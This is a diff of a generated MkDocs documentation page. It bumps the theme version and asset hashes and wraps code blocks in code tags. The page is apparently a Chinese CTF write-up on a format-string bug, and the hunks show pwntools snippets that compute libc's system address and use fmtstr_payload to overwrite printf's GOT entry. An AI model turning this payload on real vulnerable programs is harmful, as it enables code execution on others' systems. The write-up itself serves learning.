@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.2">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -2800,7 +2800,7 @@
                   <h1>Fmt</h1>
                 
                 <h2 id="_1">找偏移地址<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
-<div class="codehilite"><pre><span></span><span class="c1">#反汇编得到start函数在got.plt中的地址</span>
+<div class="codehilite"><pre><span></span><code><span class="c1">#反汇编得到start函数在got.plt中的地址</span>
 <span class="n">libc_start_got</span> <span class="o">=</span> <span class="mh">0x804a01c</span>
 <span class="c1"># 加载libc</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib32/libc.so.6&#39;</span><span class="p">)</span>
@@ -2817,10 +2817,10 @@
 <span class="n">system</span><span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">system_off</span> <span class="c1">#实际地址=基地址+偏移地址</span>
 <span class="c1"># 利用字符串格式化进行任意地址写</span>
 <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">5</span><span class="p">,{</span><span class="n">printf_got</span><span class="p">:</span><span class="n">system</span><span class="p">}))</span>
-</pre></div>
+</code></pre></div>
 
-<p><div class="codehilite"><pre><span></span>readelf -a /lib32/libc.so.6 <span class="p">|</span>grep <span class="s1">&#39;__libc_start_main&#39;</span>
-</pre></div>
+<p><div class="codehilite"><pre><span></span><code>readelf -a /lib32/libc.so.6 <span class="p">|</span>grep <span class="s1">&#39;__libc_start_main&#39;</span>
+</code></pre></div>
 <img alt="readelf" src="2019-01-20-18-00-48.png" />
 看最后1.5个byte（32位elf）
 <img alt="" src="2019-01-20-18-02-13.png" />
@@ -2924,7 +2924,7 @@
       
     </div>
     
-      <script src="../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
